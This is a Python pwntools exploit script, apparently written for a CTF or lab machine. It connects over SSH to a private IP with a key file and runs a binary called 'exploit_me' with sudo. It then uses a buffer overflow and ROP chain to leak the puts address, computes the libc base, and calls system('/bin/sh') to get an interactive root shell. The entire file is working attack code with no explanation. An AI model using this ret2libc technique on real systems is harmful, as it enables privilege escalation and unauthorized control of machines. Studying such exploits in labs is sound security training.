from pwn import *

#initializing binary, elf, libc etc.,
context.binary = binary = './exploit_me'
context.arch = 'amd64'

elf = ELF(binary)
rop = ROP(elf)

#padding, payloads and rop calls for address leak
padding = b"A"*40
rop.call(elf.sym['puts'], [elf.got.puts])       #calling puts to get the address of puts
rop.call(elf.sym['main'])                       #returning execution back to main function

payload = flat(
        padding, rop.chain())                   #chaining our inital payload together

#processes, interaction, finding puts leak
shell = ssh('zeeshan', '10.10.124.87', keyfile='id_rsa', port=22)       #using ssh to login with pwntools
#io = process(binary)
io = shell.process(['sudo','./exploit_me'])     #starting process with sudo

io.recvline()
io.sendline(payload)
leak = u64(io.recvline().rstrip().ljust(8,b'\0'))
log.info(f"Found puts leak at => {hex(leak)}")

#calculating base address of libc and rebasing
#matching leaked puts address with https://libc.blukat.me/ we get the required libc(amd64)
libc = ELF('libc6_2.23-0ubuntu11.2_amd64.so', checksec=False)
libc.address = leak - libc.sym['puts']
log.info(f"base address libc => {hex(libc.address)}")

#final payload to call /bin/sh
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

#poping shell
io.recvline()
io.sendline(payload)

io.interactive()
